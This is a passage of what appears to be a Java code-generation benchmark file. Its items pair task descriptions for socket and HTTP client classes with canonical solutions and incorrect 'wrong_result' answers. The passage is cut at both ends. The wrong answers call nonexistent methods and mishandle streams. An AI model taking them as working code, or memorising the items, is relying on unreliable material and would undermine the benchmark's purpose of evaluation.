    "Instruction": "Task Description: Create a Java class that handles socket communication for receiving and processing video stream data from an Android device using scrcpy (Screen Copy) technology.\n\nClass Description: ScrcpyInputSocketThread is a thread class that establishes a socket connection to receive video stream data from an Android device, processes the NAL units (Network Abstraction Layer units) from the stream, and manages the communication lifecycle.\n\nAttributes:\n- log: Logger - Logger instance for recording operational information\n- iDevice: IDevice - Represents the connected Android device\n- dataQueue: BlockingQueue<byte[]> - Queue for storing processed video data packets\n- scrcpyLocalThread: ScrcpyLocalThread - Reference to the main scrcpy control thread\n- androidTestTaskBootThread: AndroidTestTaskBootThread - Reference to the Android test task thread\n- session: Session - WebSocket session for sending device information\n- BUFFER_SIZE: int (static final) - Maximum buffer size for video data (10MB)\n- READ_BUFFER_SIZE: int (static final) - Chunk size for reading from the input stream (5KB)\n\nMethods:\n- Constructor(IDevice, BlockingQueue<byte[]>, ScrcpyLocalThread, Session) -> void - Initializes the thread with device, data queue, control thread, and session references\n- run() -> void - Main thread execution that:\n  1. Sets up port forwarding for scrcpy\n  2. Establishes socket connection to localhost\n  3. Sends device screen dimensions via WebSocket\n  4. Continuously reads and processes video stream data\n  5. Manages resources cleanup on termination\n  6. Handles NAL unit detection and packetization\n\nThe class implements proper resource management by:\n1. Closing sockets and streams in finally blocks\n2. Removing port forwarding when done\n3. Cleaning up session references\n4. Interrupting related threads when needed\n5. Handling IOExceptions during communication",
    "Canonical_solution": "import com.android.ddmlib.IDevice;\nimport jakarta.websocket.Session;\nimport org.cloud.sonic.agent.bridge.android.AndroidDeviceBridgeTool;\nimport org.cloud.sonic.agent.common.maps.ScreenMap;\nimport org.cloud.sonic.agent.tests.android.AndroidTestTaskBootThread;\nimport org.cloud.sonic.agent.tools.BytesTool;\nimport org.cloud.sonic.agent.tools.PortTool;\nimport org.slf4j.Logger;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.concurrent.BlockingQueue;\n\npublic class ScrcpyInputSocketThread extends Thread {\n\n    private final Logger log = LoggerFactory.getLogger(ScrcpyInputSocketThread.class);\n    private IDevice iDevice;\n    private BlockingQueue<byte[]> dataQueue;\n    private ScrcpyLocalThread scrcpyLocalThread;\n    private AndroidTestTaskBootThread androidTestTaskBootThread;\n    private Session session;\n    private static final int BUFFER_SIZE = 1024 * 1024 * 10;\n    private static final int READ_BUFFER_SIZE = 1024 * 5;\n\n    public ScrcpyInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, ScrcpyLocalThread scrcpyLocalThread, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.scrcpyLocalThread = scrcpyLocalThread;\n        this.session = session;\n        this.androidTestTaskBootThread = scrcpyLocalThread.getAndroidTestTaskBootThread();\n        this.setDaemon(false);\n        this.setName(androidTestTaskBootThread.formatThreadName(\"android-scrcpy-input-socket-task-%s-%s-%s\"));\n    }\n\n    @Override\n    public void run() {\n        int scrcpyPort = PortTool.getPort();\n        AndroidDeviceBridgeTool.forward(iDevice, scrcpyPort, \"scrcpy\");\n        Socket videoSocket = new Socket();\n        InputStream inputStream = null;\n        try {\n            videoSocket.connect(new InetSocketAddress(\"localhost\", scrcpyPort));\n            inputStream = videoSocket.getInputStream();\n            if (videoSocket.isConnected()) {\n                String sizeTotal = AndroidDeviceBridgeTool.getScreenSize(iDevice);\n                BytesTool.sendText(session, String.format(\"{\\\"msg\\\":\\\"size\\\",\\\"width\\\":\\\"%s\\\",\\\"height\\\":\\\"%s\\\"}\", \n                    sizeTotal.split(\"x\")[0], sizeTotal.split(\"x\")[1]));\n            }\n            int readLength;\n            int naLuIndex;\n            int bufferLength = 0;\n            byte[] buffer = new byte[BUFFER_SIZE];\n            while (scrcpyLocalThread.isAlive()) {\n                readLength = inputStream.read(buffer, bufferLength, READ_BUFFER_SIZE);\n                if (readLength > 0) {\n                    bufferLength += readLength;\n                    for (int i = 5; i < bufferLength - 4; i++) {\n                        if (buffer[i] == 0x00 &&\n                                buffer[i + 1] == 0x00 &&\n                                buffer[i + 2] == 0x00 &&\n                                buffer[i + 3] == 0x01\n                        ) {\n                            naLuIndex = i;\n                            byte[] naluBuffer = new byte[naLuIndex];\n                            System.arraycopy(buffer, 0, naluBuffer, 0, naLuIndex);\n                            dataQueue.add(naluBuffer);\n                            bufferLength -= naLuIndex;\n                            System.arraycopy(buffer, naLuIndex, buffer, 0, bufferLength);\n                            i = 5;\n                        }\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            if (scrcpyLocalThread.isAlive()) {\n                scrcpyLocalThread.interrupt();\n                log.info(\"scrcpy thread closed.\");\n            }\n            if (videoSocket.isConnected()) {\n                try {\n                    videoSocket.close();\n                    log.info(\"scrcpy video socket closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            if (inputStream != null) {\n                try {\n                    inputStream.close();\n                    log.info(\"scrcpy input stream closed.\");\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n        AndroidDeviceBridgeTool.removeForward(iDevice, scrcpyPort, \"scrcpy\");\n        if (session != null) {\n            ScreenMap.getMap().remove(session);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport android.util.Log;\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.BlockingQueue;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class ScrcpyInputSocketThread extends Thread {\n    private static final String TAG = \"ScrcpyInputSocketThread\";\n    private static final int BUFFER_SIZE = 10 * 1024 * 1024; // 10MB\n    private static final int READ_BUFFER_SIZE = 5 * 1024; // 5KB\n\n    private IDevice iDevice;\n    private BlockingQueue<byte[]> dataQueue;\n    private ScrcpyLocalThread scrcpyLocalThread;\n    private AndroidTestTaskBootThread androidTestTaskBootThread;\n    private Session session;\n\n    public ScrcpyInputSocketThread(IDevice iDevice, BlockingQueue<byte[]> dataQueue, ScrcpyLocalThread scrcpyLocalThread, Session session) {\n        this.iDevice = iDevice;\n        this.dataQueue = dataQueue;\n        this.scrcpyLocalThread = scrcpyLocalThread;\n        this.session = session;\n    }\n\n    @Override\n    public void run() {\n        Socket socket = null;\n        InputStream inputStream = null;\n        try {\n            // Set up port forwarding for scrcpy\n            scrcpyLocalThread.forwardPort();\n\n            // Establish socket connection to localhost\n            socket = new Socket(\"localhost\", scrcpyLocalThread.getForwardedPort());\n            inputStream = socket.getInputStream();\n\n            // Send device screen dimensions via WebSocket\n            session.send(\"{\\\"width\\\": \" + iDevice.getWidth() + \", \\\"height\\\": \" + iDevice.getHeight() + \"}\");\n\n            byte[] buffer = new byte[READ_BUFFER_SIZE];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                byte[] data = new byte[bytesRead];\n                System.arraycopy(buffer, 0, data, 0, bytesRead);\n                dataQueue.put(data);\n            }\n        } catch (IOException | InterruptedException e) {\n            Log.e(TAG, \"Error in ScrcpyInputSocketThread: \" + e.getMessage());\n        } finally {\n            try {\n                if (inputStream != null) inputStream.close();\n                if (socket != null) socket.close();\n            } catch (IOException e) {\n                Log.e(TAG, \"Error closing socket or input stream: \" + e.getMessage());\n            }\n            // Remove port forwarding\n            scrcpyLocalThread.removeForwardPort();\n            // Clean up session references\n            session = null;\n            // Interrupt related threads if needed\n            if (androidTestTaskBootThread != null) {\n                androidTestTaskBootThread.interrupt();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 578,
    "Instruction": "Task Description: Implement a Java class for sending HTTP requests and receiving responses using socket communication.\n\nClass Description: The HTTPRequest class extends HTTPPacket and provides functionality to send HTTP POST requests to a specified server. It handles connection management, request formatting, and response processing, with support for keep-alive connections and chunked transfer encoding.\n\nAttributes:\npostSocket: Socket - The socket used for communication with the server\n\nMethods:\npost: [Name](host: String, port: int, isKeepAlive: boolean) -> HTTPResponse - Sends an HTTP POST request to the specified host and port, with optional keep-alive connection\npost: [Name](host: String, port: int) -> HTTPResponse - Sends an HTTP POST request to the specified host and port with connection closing by default (calls the 3-parameter version with isKeepAlive=false)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.InetSocketAddress;\n\npublic class HTTPRequest extends HTTPPacket {\n\n    private Socket postSocket = null;\n\n    public HTTPResponse post(String host, int port, boolean isKeepAlive) {\n        HTTPResponse httpRes = new HTTPResponse();\n        setHost(host);\n        setConnection((isKeepAlive == true) ? HTTP.KEEP_ALIVE : HTTP.CLOSE);\n        boolean isHeaderRequest = isHeadRequest();\n        \n        OutputStream out = null;\n        InputStream in = null;\n        \n        try {\n            if (postSocket == null){\n                postSocket = new Socket();\n                postSocket.connect(new InetSocketAddress(host, port), HTTPServer.DEFAULT_TIMEOUT);\n            }\n\n            out = postSocket.getOutputStream();\n            PrintStream pout = new PrintStream(out);\n\n            String httpPacket = \"\";\n            httpPacket += getHeader();\n            httpPacket += HTTP.CRLF;\n            \n            boolean isChunkedRequest = isChunked();\n            String content = getContentString();\n            int contentLength = 0;\n            if (content != null)\n                contentLength = content.length();\n            \n            if (0 < contentLength) {\n                if (isChunkedRequest == true) {\n                    String chunSizeBuf = Long.toHexString(contentLength);\n                    httpPacket += chunSizeBuf;\n                    httpPacket += HTTP.CRLF;\n                }\n                httpPacket += content;\n                if (isChunkedRequest == true) {\n                    httpPacket += HTTP.CRLF;\n                }\n            }\n\n            if (isChunkedRequest == true) {\n                httpPacket += \"0\";\n                httpPacket += HTTP.CRLF;\n            }\n\n            pout.print(httpPacket);\n            pout.flush();\n\n            in = postSocket.getInputStream();\n            httpRes.set(in, isHeaderRequest);        \n        } catch (SocketException e) {\n            httpRes.setStatusCode(HTTPStatus.INTERNAL_SERVER_ERROR);\n        } catch (IOException e) {\n            httpRes.setStatusCode(HTTPStatus.INTERNAL_SERVER_ERROR);\n        } finally {\n            if (isKeepAlive == false) {    \n                try {\n                    if (in != null) in.close();\n                } catch (Exception e) {};\n                try {\n                    if (out != null) out.close();\n                } catch (Exception e) {};\n                try {\n                    if (postSocket != null) postSocket.close();\n                } catch (Exception e) {};\n                postSocket = null;\n            }\n        }\n        \n        return httpRes;\n    }\n\n    public HTTPResponse post(String host, int port) {\n        return post(host, port, false);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "public class HTTPRequest extends HTTPPacket {\n    private Socket postSocket;\n\n    public HTTPResponse post(String host, int port, boolean isKeepAlive) throws IOException {\n        postSocket = new Socket(host, port);\n        StringBuilder request = new StringBuilder();\n        request.append(\"POST \").append(getPath()).append(\" HTTP/1.1\\r\\n\");\n        request.append(\"Host: \").append(host).append(\"\\r\\n\");\n        request.append(\"Content-Type: \").append(getContentType()).append(\"\\r\\n\");\n        request.append(\"Content-Length: \").append(getContentLength()).append(\"\\r\\n\");\n        if (isKeepAlive) {\n            request.append(\"Connection: keep-alive\\r\\n\");\n        } else {\n            request.append(\"Connection: close\\r\\n\");\n        }\n        request.append(\"\\r\\n\");\n        request.append(getRequestBody());\n        OutputStream out = postSocket.getOutputStream();\n        out.write(request.toString().getBytes());\n        out.flush();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(postSocket.getInputStream()));\n        String line;\n        StringBuilder response = new StringBuilder();\n        while ((line = in.readLine()) != null) {\n            response.append(line).append(\"\\r\\n\");\n        }\n        return new HTTPResponse(response.toString());\n    }\n\n    public HTTPResponse post(String host, int port) throws IOException {\n        return post(host, port, false);\n    }\n}"
  },
  {
    "Task_id": 579,
    "Instruction": "Task Description: Create a TCP client class in Java that can connect to a server, send messages, receive responses, and properly close the connection.\n\nClass Description: The TCPClient class provides functionality for establishing and managing a TCP connection with a server. It handles connection establishment, message sending/receiving, and resource cleanup.\n\nAttributes:\n- mClientSocket: [Socket] - The socket object representing the connection to the server\n- mPrintWriter: [PrintWriter] - Output stream for sending data to the server\n- mBufferedReader: [BufferedReader] - Input stream for receiving data from the server\n\nMethods:\n- connectTCPServer(): [void] - Establishes a persistent connection to the TCP server at \"localhost:8688\" and continuously listens for incoming messages\n- sendMessage(String msg): [void] - Sends a message to the connected server (Input: msg - the message string to send)\n- closeConnection(): [void] - Properly closes all network resources and connections",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.Socket;\n\npublic class TCPClient {\n\n    private Socket mClientSocket;\n    private PrintWriter mPrintWriter;\n    private BufferedReader mBufferedReader;\n\n    public void connectTCPServer() {\n        Socket socket = null;\n        while (socket == null) {\n            try {\n                socket = new Socket(\"localhost\", 8688);\n                mClientSocket = socket;\n                mPrintWriter = new PrintWriter(new BufferedWriter(\n                        new OutputStreamWriter(socket.getOutputStream())), true);\n                System.out.println(\"connect server success\");\n            } catch (IOException e) {\n                System.out.println(\"connect tcp server failed, retry...\");\n            }\n        }\n\n        try {\n            mBufferedReader = new BufferedReader(new InputStreamReader(\n                    socket.getInputStream()));\n            while (true) {\n                String msg = mBufferedReader.readLine();\n                System.out.println(\"receive :\" + msg);\n                if (msg != null) {\n                    System.out.println(\"server:\" + msg);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String msg) {\n        if (!msg.isEmpty() && mPrintWriter != null) {\n            mPrintWriter.println(msg);\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (mClientSocket != null) {\n                mClientSocket.shutdownInput();\n                mClientSocket.close();\n            }\n            if (mPrintWriter != null) {\n                mPrintWriter.close();\n            }\n            if (mBufferedReader != null) {\n                mBufferedReader.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TCPClient {\n    private Socket mClientSocket;\n    private PrintWriter mPrintWriter;\n    private BufferedReader mBufferedReader;\n\n    public void connectTCPServer() {\n        try {\n            mClientSocket = new Socket(\"localhost\", 8688);\n            mPrintWriter = new PrintWriter(mClientSocket.getOutputStream(), true);\n            mBufferedReader = new BufferedReader(new InputStreamReader(mClientSocket.getInputStream()));\n            String response;\n            while ((response = mBufferedReader.readLine()) != null) {\n                System.out.println(\"Server: \" + response);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            closeConnection();\n        }\n    }\n\n    public void sendMessage(String msg) {\n        if (mPrintWriter != null) {\n            mPrintWriter.println(msg);\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (mBufferedReader != null) {\n                mBufferedReader.close();\n            }\n            if (mPrintWriter != null) {\n                mPrintWriter.close();\n            }\n            if (mClientSocket != null) {\n                mClientSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 58,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client using HttpURLConnection for making network requests, with support for request configuration, response handling, and optional GZIP compression.\n\nClass Description: Networker is a singleton class that manages HTTP requests and responses. It uses a thread pool for asynchronous request execution and provides methods for configuring requests, handling responses, and managing connection settings.\n\nAttributes:\n\nsInstance: Networker - Singleton instance of the Networker class\nsExecutor: Executor - Thread pool executor for handling requests asynchronously\nREAD_TIMEOUT_MS: int - Timeout for reading from connection (10000ms)\nCONNECT_TIMEOUT_MS: int - Timeout for establishing connection (15000ms)\nHEADER_ACCEPT_ENCODING: String - Header key for accept encoding (\"Accept-Encoding\")\nGZIP_ENCODING: String - Value for GZIP encoding (\"gzip\")\n\nMethods:\n\nget(): void -> Networker - Returns the singleton instance of Networker\nsubmit(HttpRequest request, Callback callback): void - Submits an HTTP request for asynchronous execution\nHttpRequestTask(HttpRequest request, Callback callback): void - Constructor for the internal request task class\nrun(): void - Executes the HTTP request task\ndoFetch(): void -> HttpResponse - Performs the actual HTTP request and returns the response\nconfigureAndConnectRequest(): void -> HttpURLConnection - Configures and connects the HTTP request\nrequestDecompression(HttpURLConnection conn): void - Sets the Accept-Encoding header for GZIP compression\napplyDecompressionIfApplicable(HttpURLConnection conn, InputStream in): InputStream - Applies GZIP decompression if needed\ncopy(InputStream in, OutputStream out, byte[] buf): void - Copies data between streams\nHttpRequest(Builder b): void - Constructor for HTTP request object\nnewBuilder(): void -> Builder - Creates a new HttpRequest builder\nBuilder(): void - Constructor for HttpRequest builder\nfriendlyName(String friendlyName): Builder -> Builder - Sets friendly name for request\nmethod(HttpMethod method): Builder -> Builder - Sets HTTP method\nurl(String url): Builder -> Builder - Sets request URL\nbody(byte[] body): Builder -> Builder - Sets request body\nbuild(): void -> HttpRequest - Builds the HttpRequest object\nHttpResponse(int statusCode, byte[] body): void - Constructor for HTTP response object\nonResponse(HttpResponse result): void - Callback for successful response\nonFailure(IOException e): void - Callback for failed request",
    "Canonical_solution": "import com.facebook.stetho.urlconnection.ByteArrayRequestEntity;\nimport com.facebook.stetho.urlconnection.SimpleRequestEntity;\nimport com.facebook.stetho.urlconnection.StethoURLConnectionManager;\nimport javax.annotation.Nullable;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.concurrent.Executor;\nimport java.util.concurrent.Executors;\nimport java.util.zip.GZIPInputStream;\n\npublic class Networker {\n  private static Networker sInstance;\n  private final Executor sExecutor = Executors.newFixedThreadPool(4);\n  private static final int READ_TIMEOUT_MS = 10000;\n  private static final int CONNECT_TIMEOUT_MS = 15000;\n  private static final String HEADER_ACCEPT_ENCODING = \"Accept-Encoding\";\n  private static final String GZIP_ENCODING = \"gzip\";\n\n  public static synchronized Networker get() {\n    if (sInstance == null) {\n      sInstance = new Networker();\n    }\n    return sInstance;\n  }\n\n  private Networker() {\n  }\n\n  public void submit(HttpRequest request, Callback callback) {\n    sExecutor.execute(new HttpRequestTask(request, callback));\n  }\n\n  private class HttpRequestTask implements Runnable {\n    private final HttpRequest request;\n    private final Callback callback;\n    private final StethoURLConnectionManager stethoManager;\n\n    public HttpRequestTask(HttpRequest request, Callback callback) {\n      this.request = request;\n      this.callback = callback;\n      stethoManager = new StethoURLConnectionManager(request.friendlyName);\n    }\n\n    @Override\n    public void run() {\n      try {\n        HttpResponse response = doFetch();\n        callback.onResponse(response);\n      } catch (IOException e) {\n        callback.onFailure(e);\n      }\n    }\n\n    private HttpResponse doFetch() throws IOException {\n      HttpURLConnection conn = configureAndConnectRequest();\n      try {\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        InputStream rawStream = conn.getInputStream();\n        try {\n          rawStream = stethoManager.interpretResponseStream(rawStream);\n          InputStream decompressedStream = applyDecompressionIfApplicable(conn, rawStream);\n          if (decompressedStream != null) {\n            copy(decompressedStream, out, new byte[1024]);\n          }\n        } finally {\n          if (rawStream != null) {\n            rawStream.close();\n          }\n        }\n        return new HttpResponse(conn.getResponseCode(), out.toByteArray());\n      } finally {\n        conn.disconnect();\n      }\n    }\n\n    private HttpURLConnection configureAndConnectRequest() throws IOException {\n      URL url = new URL(request.url);\n      HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n      try {\n        conn.setReadTimeout(READ_TIMEOUT_MS);\n        conn.setConnectTimeout(CONNECT_TIMEOUT_MS);\n        conn.setRequestMethod(request.method.toString());\n        requestDecompression(conn);\n\n        SimpleRequestEntity requestEntity = null;\n        if (request.body != null) {\n          requestEntity = new ByteArrayRequestEntity(request.body);\n        }\n\n        stethoManager.preConnect(conn, requestEntity);\n        try {\n          if (request.method == HttpMethod.POST) {\n            if (requestEntity == null) {\n              throw new IllegalStateException(\"POST requires an entity\");\n            }\n            conn.setDoOutput(true);\n            requestEntity.writeTo(conn.getOutputStream());\n          }\n\n          conn.connect();\n          stethoManager.postConnect();\n          return conn;\n        } catch (IOException inner) {\n          stethoManager.httpExchangeFailed(inner);\n          throw inner;\n        }\n      } catch (IOException outer) {\n        conn.disconnect();\n        throw outer;\n      }\n    }\n  }\n\n  private static void requestDecompression(HttpURLConnection conn) {\n    conn.setRequestProperty(HEADER_ACCEPT_ENCODING, GZIP_ENCODING);\n  }\n\n  @Nullable\n  private static InputStream applyDecompressionIfApplicable(\n      HttpURLConnection conn, @Nullable InputStream in) throws IOException {\n    if (in != null && GZIP_ENCODING.equals(conn.getContentEncoding())) {\n      return new GZIPInputStream(in);\n    }\n    return in;\n  }\n\n  private static void copy(InputStream in, OutputStream out, byte[] buf) throws IOException {\n    if (in == null) {\n      return;\n    }\n    int n;\n    while ((n = in.read(buf)) != -1) {\n      out.write(buf, 0, n);\n    }\n  }\n\n  public static class HttpRequest {\n    public final String friendlyName;\n    public final HttpMethod method;\n    public final String url;\n    public final byte[] body;\n\n    public static Builder newBuilder() {\n      return new Builder();\n    }\n\n    HttpRequest(Builder b) {\n      this.friendlyName = b.friendlyName;\n      this.method = b.method;\n      this.url = b.url;\n      this.body = b.body;\n    }\n\n    public static class Builder {\n      private String friendlyName;\n      private Networker.HttpMethod method;\n      private String url;\n      private byte[] body = null;\n\n      Builder() {\n      }\n\n      public Builder friendlyName(String friendlyName) {\n        this.friendlyName = friendlyName;\n        return this;\n      }\n\n      public Builder method(Networker.HttpMethod method) {\n        this.method = method;\n        return this;\n      }\n\n      public Builder url(String url) {\n        this.url = url;\n        return this;\n      }\n\n      public Builder body(byte[] body) {\n        this.body = body;\n        return this;\n      }\n\n      public HttpRequest build() {\n        return new HttpRequest(this);\n      }\n    }\n  }\n\n  public static enum HttpMethod {\n    GET, POST\n  }\n\n  public static class HttpResponse {\n    public final int statusCode;\n    public final byte[] body;\n\n    HttpResponse(int statusCode, byte[] body) {\n      this.statusCode = statusCode;\n      this.body = body;\n    }\n  }\n\n  public interface Callback {\n    public void onResponse(HttpResponse result);\n    public void onFailure(IOException e);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class Networker {\n    private static Networker sInstance;\n    private final Executor sExecutor;\n    private static final int READ_TIMEOUT_MS = 10000;\n    private static final int CONNECT_TIMEOUT_MS = 15000;\n    private static final String HEADER_ACCEPT_ENCODING = \"Accept-Encoding\";\n    private static final String GZIP_ENCODING = \"gzip\";\n\n    private Networker(Executor executor) {\n        sExecutor = executor;\n    }\n\n    public static Networker get() {\n        if (sInstance == null) {\n            synchronized (Networker.class) {\n                if (sInstance == null) {\n                    sInstance = new Networker(Executors.newFixedThreadPool(5));\n                }\n            }\n        }\n        return sInstance;\n    }\n\n    public void submit(HttpRequest request, Callback callback) {\n        sExecutor.execute(new HttpRequestTask(request, callback));\n    }\n\n    private class HttpRequestTask implements Runnable {\n        private final HttpRequest request;\n        private final Callback callback;\n\n        HttpRequestTask(HttpRequest request, Callback callback) {\n            this.request = request;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            try {\n                HttpResponse response = doFetch();\n                callback.onResponse(response);\n            } catch (IOException e) {\n                callback.onFailure(e);\n            }\n        }\n\n        private HttpResponse doFetch() throws IOException {\n            HttpURLConnection conn = configureAndConnectRequest();\n            requestDecompression(conn);\n            InputStream in = conn.getInputStream();\n            in = applyDecompressionIfApplicable(conn, in);\n            byte[] body = copy(in, new ByteArrayOutputStream(), new byte[4096]).toByteArray();\n            return new HttpResponse(conn.getResponseCode(), body);\n        }\n\n        private HttpURLConnection configureAndConnectRequest() throws IOException {\n            URL url = new URL(request.url());\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(request.method().name());\n            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);\n            conn.setReadTimeout(READ_TIMEOUT_MS);\n            conn.setDoOutput(true);\n            conn.setRequestProperty(\"Content-Type\", \"application/json\");\n            if (request.body() != null) {\n                conn.getOutputStream().write(request.body());\n            }\n            return conn;\n        }\n\n        private void requestDecompression(HttpURLConnection conn) {\n            conn.setRequestProperty(HEADER_ACCEPT_ENCODING, GZIP_ENCODING);\n        }\n\n        private InputStream applyDecompressionIfApplicable(HttpURLConnection conn, InputStream in) throws IOException {\n            String contentEncoding = conn.getContentEncoding();\n            if (contentEncoding != null && contentEncoding.contains(GZIP_ENCODING)) {\n                return new GZIPInputStream(in);\n            }\n            return in;\n        }\n\n        private ByteArrayOutputStream copy(InputStream in, OutputStream out, byte[] buf) throws IOException {\n            int len;\n            while ((len = in.read(buf)) > 0) {\n                out.write(buf, 0, len);\n            }\n            return (ByteArrayOutputStream) out;\n        }\n    }\n\n    public static class HttpRequest {\n        private final String friendlyName;\n        private final HttpMethod method;\n        private final String url;\n        private final byte[] body;\n\n        private HttpRequest(Builder b) {\n            this.friendlyName = b.friendlyName;\n            this.method = b.method;\n            this.url = b.url;\n            this.body = b.body;\n        }\n\n        public String friendlyName() {\n            return friendlyName;\n        }\n\n        public HttpMethod method() {\n            return method;\n        }\n\n        public String url() {\n            return url;\n        }\n\n        public byte[] body() {\n            return body;\n        }\n\n        public static Builder newBuilder() {\n            return new Builder();\n        }\n\n        public static class Builder {\n            private String friendlyName;\n            private HttpMethod method;\n            private String url;\n            private byte[] body;\n\n            public Builder friendlyName(String friendlyName) {\n                this.friendlyName = friendlyName;\n                return this;\n            }\n\n            public Builder method(HttpMethod method) {\n                this.method = method;\n                return this;\n            }\n\n            public Builder url(String url) {\n                this.url = url;\n                return this;\n            }\n\n            public Builder body(byte[] body) {\n                this.body = body;\n                return this;\n            }\n\n            public HttpRequest build() {\n                return new HttpRequest(this);\n            }\n        }\n    }\n\n    public static class HttpResponse {\n        private final int statusCode;\n        private final byte[] body;\n\n        HttpResponse(int statusCode, byte[] body) {\n            this.statusCode = statusCode;\n            this.body = body;\n        }\n\n        public int statusCode() {\n            return statusCode;\n        }\n\n        public byte[] body() {\n            return body;\n        }\n    }\n\n    public interface Callback {\n        void onResponse(HttpResponse result);\n        void onFailure(IOException e);\n    }\n\n    public enum HttpMethod {\n        GET, POST, PUT, DELETE\n    }\n}"
  },
  {
    "Task_id": 581,
    "Instruction": "Task Description: Implement a TCP-based unicast communication class that handles both client and server roles for message exchange between two endpoints.\n\nClass Description: UnicastTestTcpSlow is a TCP unicast communication class that establishes connections, sends and receives messages, and manages socket resources. It acts as both a client (connecting to remote endpoints) and a server (accepting incoming connections).\n\nAttributes:\n- local: InetSocketAddress - Local address and port for server socket binding\n- remote: InetSocketAddress - Remote address and port for client connection\n- sock: Socket - Client socket for outgoing connections\n- output: DataOutputStream - Output stream for sending data\n- output_lock: Lock - Synchronization lock for thread-safe output operations\n- srv_sock: ServerSocket - Server socket for accepting incoming connections\n- acceptor: Acceptor - Thread that handles incoming connections\n\nMethods:\n- init(String local_addr, String remote_addr, int local_port, int remote_port) -> void - Initializes the communication by setting up server socket and attempting client connection\n- receive(Message msg) -> void - Handles received messages by printing message type\n- readMessage(byte[] buf, int offset, int length) -> Message - Static helper method to deserialize message from byte array\n\nNested Class:\n- Acceptor: Thread - Handles incoming connections and message processing\n  Methods:\n  - run() -> void - Main acceptor loop that accepts connections and processes messages\n  - handleRequest(DataInputStream in) -> void - Reads and processes individual messages from input stream",
    "Canonical_solution": "import org.jgroups.BytesMessage;\nimport org.jgroups.Global;\nimport org.jgroups.Message;\nimport org.jgroups.Version;\nimport org.jgroups.util.*;\n\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicLong;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class UnicastTestTcpSlow {\n    protected InetSocketAddress    local, remote;\n    protected Socket               sock;\n    protected DataOutputStream     output;\n    protected final Lock           output_lock=new ReentrantLock();\n    protected ServerSocket         srv_sock;\n    protected Acceptor             acceptor;\n\n    protected static final boolean TCP_NODELAY=false;\n    protected static final int     SOCK_SEND_BUF_SIZE=200 * 1000;\n    protected static final int     SOCK_RECV_BUF_SIZE=200 * 1000;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) throws Exception {\n        local=new InetSocketAddress(local_addr, local_port);\n        remote=new InetSocketAddress(remote_addr, remote_port);\n        srv_sock=Util.createServerSocket(new DefaultSocketFactory(), \"server\", local.getAddress(), local.getPort(), local.getPort(), 0);\n        System.out.println(\"Listening on \" + srv_sock.getLocalSocketAddress());\n        acceptor=new Acceptor();\n        acceptor.start();\n\n        sock=new Socket();\n        sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n        sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n        try {\n            sock.connect(remote);\n            output=new DataOutputStream(new BufferedOutputStream(sock.getOutputStream()));\n            System.out.println(\"Connected to \" + sock.getRemoteSocketAddress());\n        }\n        catch(Throwable t) {\n            System.out.println(\"Failed connecting to \" + remote + \": will only act as server\");\n        }\n    }\n\n    protected class Acceptor extends Thread {\n        protected byte[] buf=new byte[1024];\n\n        public void run() {\n            while(!srv_sock.isClosed()) {\n                Socket client_sock=null;\n                DataInputStream in=null;\n                try {\n                    client_sock=srv_sock.accept();\n                    client_sock.setTcpNoDelay(TCP_NODELAY);\n                    client_sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n                    client_sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n                    in=new DataInputStream(new BufferedInputStream(client_sock.getInputStream()));\n                    while(!client_sock.isClosed())\n                        